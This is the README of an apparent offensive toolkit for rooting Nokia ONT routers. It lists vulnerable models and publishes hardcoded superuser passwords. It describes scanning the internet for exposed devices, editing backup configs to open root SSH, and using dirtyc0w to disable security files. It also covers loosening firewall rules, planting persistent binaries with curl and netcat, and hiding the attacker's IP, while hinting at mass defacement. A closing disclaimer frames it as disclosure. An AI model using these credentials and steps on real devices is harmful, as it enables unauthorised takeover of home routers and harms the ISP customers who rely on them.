Scripts, binaries and guides for finding, rooting, and bypassing security protocols to maintain persistent access on Nokia ONT devices.  

vulnerable models (known):  G-0425G-A, G-0425G-C, G-120W-F, G-140W-C, G-140W-G, G-140W-H,  G-1425G-A, G-1425G-B, G-240G-E, G-240W-C, G-240W-F, G-240W-G,  G-240W-J, G-241W-A, G-2425G-A, G-2425G-B, G-2426G-A

USAGE

The only compiled code in this repo is compiled to be run on the target devices. Everything else is either a Shell or Python script.

This set of tools, scripts etc was developed on Kali Nethunter in order to quickly grab a rootshell on a Nokia router after exploiting another vulnerability common to these deviced in their WPS PIN generation.

Any distribution of GNU/Linux should work just fine. MacOSX would require some alterations to function (mostly changing the shebangs from /bin/bash to /opt/local/bin/bash and some other paths, but also installing the GNU versions of tools such as sed and grep). Windows is not supported, although using WSL may provide compatibility.

The only scripts that need to be "installed" (placed somewhere along your $PATH) are exploitation/nokia-use-ip-cfg and exploitation/nokia-xml-editor).

For use on Android (in Termux), see INSTALLATION.txt.

HOW IT WORKS

The usual method for configuring these devices is through an HTTP interface, served locally over port 80 and frequently served over WAN on either port 443 (https) or port 8080. End users are allowed access via limited account "userAdmin" using the same password as the default PSK for their wifi.  End users are not informed of the hardcoded login credentials for the superuser account, AdminGPON:ALC#FGU, but these are easily found through a Google search.  

There are exceptions, but these exceptions typically do little for the overall security of these devices. For instance, Telmex ONTs have only one account, "TELMEX", with the privileges of  the AdminGPON account. This account also uses the wifi password as the default login password, making these devices less easily accessed when discovered over WAN. However, they come with WPS enabled by default, and their WPS instance is vulnerable to the PixieDust attack, making both access to the network as well as superuser credentials trivial for an attacker with proximity to the device to obtain.

The configuration files for these devices can be saved on the page "Backup and Restore," creating a file named "config.cfg". This file can be easily decrypted to a readable .xml file, which contains many configuration options not available  on any page of the HTTP interface. The most important of these are the ones that allow access via SSH, and bypass the "vtysh"  shell, allowing direct access to /bin/sh. Reupload of the configuration file causes the ONT to reboot, taking it offline for a few minutes. Once back online, SSH will be served either on port 22 or (more commonly) on port 8022. Credentials to login are ONTUSER:admin. 

This repo has been divided into three sections: Targeting, Exploitation, and Post-Exploitation.

TARGETING

These scripts depend on several other packages which are not provided in this repo, namely:  

python
bash
nmap 
urlencode 
geoiplookup/ipinfo
curl  

For the zoomeye script, you must also register a free account on zoomeye. We are not promoting their service nor do we have any relationship with zoomeye, paid or otherwise. We encourage you to use any similar service you like to search for vulnerable devices using the same or similar parameters.   

For devices located in Spanish-speaking countries,  "GPON Home Gateway" may be substituted with "Terminal Óptica".  Port 443 is the most common for serving the login page over WAN, however some examples have been found at port 8080 as well.  jQuery 1.12 is the version most commonly associated with firmware  that allows access with default credentials AdminGPON:ALC#FGU, however this may not work with every device you find that uses this version of jQuery. By the same token, some devices running newer versions may still contain these hardcoded credentials.  For whatever reason, zoomeye, shodan, and other IOT device search engines may find one vulnerable device but fail to find more in the same IP subnet. 

The idea behind ip-range-scan.sh is to check these subnets to see if any other Nokia routers have their login pages exposed. Typically, if the hardcoded credentials work on one of them, they will work on all (or almost all) of the devices installed by the same ISP.  

EXPLOITATION

Once authentication on a vulnerable device is achieved and the config.cfg file has been saved to the standard download directory, autopwn.sh can be used to unpack, modify, and repack this file in a matter of seconds, saving it as "dropbear" in the same directory that config.cfg was downloaded to. Uploading this file to the device will allow you root access via SSH.

decrypt-all.sh should probably be called something else as the  "encryption" used for sensitive values in many of the .xml files is really more of an encoding than true encryption. More to the point, this script allows you to quickly strip out all of the values that Nokia deemed sensitive and view them in plain text.  In some implementations of the vulnerable firmware, no encryption or encoding is used for such values. However, those familiar with UNIX-based systems will recognize the occasional use of values that have been *actually* encrypted with one-way hashing algorithms (identifiable by their format beginning with a number between 1 and 5 followed by $ and a string of 32 or 64 characters). If you wish to decrypt such values, we recommend using hashcat. 

Although nokia-xml-editor sets the standard SSH port of 22 for incoming connections, iptables rules present on the vast majority of vulnerable devices will only allow connections to SSH over WAN using port 8022. For LAN-accessible devices, port 22 should work with no issues.  After uploading the altered config file to the target, it will reboot, and it will take a few minutes (longer for PPPOE devices) for it to come back online. Once the device is back online, access with 

ssh ONTUSER@[ip-address-of-device] -p 8022  

As these devices frequently use deprecated algorithms, an up-to-date SSH client such as OpenSSH will refuse to connect to them unless  specifically allowed to communicate using these insecure protocols. 

Example:   
No matching host key algorithms found. Their offer: ssh-rsa  
ssh ONTUSER@[ip-address-of-device] -p 8022 -oHostKeyAlgorithms=+ssh-rsa  

POST-EXPLOITATION 

The two most common architectures for these SoCs are little endian MIPS/ARM. Compiled binaries are labeled as either "mipsle" or "armhf". If your target device uses MIPS big endian, unfortunately you will have to compile your own static busybox/dropbearmulti binaries, but a compiled MIPSbe binary for dirtyc0w is available.

Even the unrestricted shell has some restrictions -- at first. These devices run a variety of Linux kernels - 3.4, 3.18.21, 4.1.45 have all been observed - but what all of them have in common is vulnerability to a race condition in copy-on-write, exploited as "dirtyc0w". This allows changes to read-only files stored on the root squashfs filesystem  (although these changes will not persist after a reboot).
  
Most of the post_exploitation scripts do not require any binaries except those found by default on the devices, and should work regardless of the CPU type present. Endianness is determined and displayed during the unpacking of the config.cfg file. armv7l is always little endian, so any result showing big endian  can be safely assumed to indicate MIPS. Once in the root shell, examine /proc/cpuinfo to find which  architecture/SoC the device contains.

The devices built around mipsle still use uclibc-0.9.33.2 (from 2012). That's a huge pain to build a toolchain for in modern times,  so in order to produce working and updated binaries, they have been statically linked.  (Even maintainers of these devices using the official propietary toolchains struggle to get them to work: see https://github.com/lxc/lxc/issues/3440).  

There are several ways to get these files onto the target device, as their stock firmware contains curl, wget, nc,  and plenty of other fun tools (including tcpdump). (They are badly deprecated versions, so make sure to check syntax).  To persist after reboots, the target for these binaries is /configs/bin, /configs being the mount point for one of the UBI filesystems.  As space is limited, it is advisable to use /var as a staging area. 

In some cases, files larger than ~400K fail to upload over WAN. You can split and then concatenate the files, compress them with bzip2/gzip, or both. (Make sure to get iptables to accept connections over port 4545  on the target device before beginning this process).  Only do this if necessary - some devices will accept everything in both scripts and the appropriate bins directory as one big tarball).

Here are some upload methods, using a local network as an example - when deploying to a device accessible via WAN, use a tunnel to avoid exposing your IP address.

1) Compress the files into a gzipped tar and host over HTTP:     

(on your device)    
cd nokia_superuser_tools/post_exploitation    
tar czf bin.tgz full-bins/* scripts/*
python3 -m http.server 9000        

(on target)    
curl 192.168.1.45:9000/bin.tgz -o /var/bin.tgz    
mkdir /configs/bin && cd /configs/bin    
tar xzvf /var/bin.tgz    
rm /var/bin.tgz  

2) Have tar compress the files to stdout and pipe stdout through netcat     

(on target)    
nc -l -p 4545 > /var/bin.tgz < /dev/null     

(on your device)    
tar czf - full-bins/*  scripts/* | nc 192.168.1.254 4545     

(on target once more)    
cd /configs/bin  && tar xzvf /var/bin.tgz  

SCRIPTS  
fix-mount
Find which mount points have nodev, noexec, and/or nosuid tags and remove them 
fix-ssh
runs the new dropbear server on port 2244
update-profile   
Runs in the background rewriting /etc/profile and /etc/home/ONTUSER/.bashprofile  with desirable parameters   (to execute as a background process, append & )
update-iptables   
changes iptables policies to be as permissive as possible without breaking connectivity 
new-seconf
uses dirtyc0w exploit to rewrite read-only file /usr/etc/se.conf with security disabled
newguardian
uses dirtyc0w exploit to rewrite read-only file /usr/exe/data_guardian.sh and allow modifications 
chungus-web
mounts a tmpfs on top of /webs, copies the gpon home chungus webpage to it, and runs busybox httpd instead of thttpd pointing to it

DISCLAIMER  

These tools have been released in the hope that they will be used responsibly, to demonstrate the urgent need to continually update embedded devices. It is doubtful that the ISPs who distribute these devices fully appreciate the insecurity by default that their presence introduces for their users. This is why we should not accept deployment of propietary drivers, firmware, etc - when maintainers have no choice but to continue to use deprecated kernels,  C libraries, compilers, algorithms, etc as the propietary tools depend on them, every new build includes the old problems.   ISPs would never admit this, but gaining access to the command line as root  makes it impossible to deny. We have seen devices whose /proc/version clearly states that the image was built as late as 2023, but using buildroot from 2015 to build kernel 3.18.21 (also released in 2015), and as they were built around uClibc 0.9.33.2 (released May 2012), they had to use a deprecated toolchain based on GCC 4.6.3 (released March 2012).  

Why update at all if the update doesn't fix critical bugs from a decade ago?  

This is a waste of everyone's time.  

Furthermore, we hope to demonstrate that "security through obscurity" is  no substitute for actual security. Finding the key points in the configuration files to alter has allowed us to consistently access the root shell across dozens of different router models, firmware versions, etc. If we could figure this out, then we feel confident in the conclusion that bad actors could do so as well, and likely already have.  

It is wholly unacceptable for ISPs whose users put their trust in them to betray it so thoroughly. These devices not only do not support the newest WPA3  authentication protocols, but even the algorithms they use for WPA2  (namely, TKIP) have been demonstrated to be needlessly insecure. Those ISPs who enable WPS by default on these devices have done their users the opposite of a favor, as their WPS PIN generation can be cracked in seconds. 

The fact of the matter is that all of the security issues on these devices can be fixed without replacing any hardware. There are MIPS routers with the exact CPU types found in these devices running the latest kernels. 

These security flaws are there because Nokia doesn't care enough to fix them, and ISPs care even less. It is only a matter of time before these glaring vulnerabilities are leveraged to run a massive botnet, spam email drive, DDoS attack, or some other similar nastiness. But perhaps action will be taken before such incidents if hundreds of thousands of routers suddenly display a big chungus (that goes back to normal upon reboot without lasting damage). One can only imagine, as this is purely hypothetical and the author of this repo would like to repeat once more that they do not condone any illegal activities.

Have fun, don't be malicious, and may the Chungus be with you.
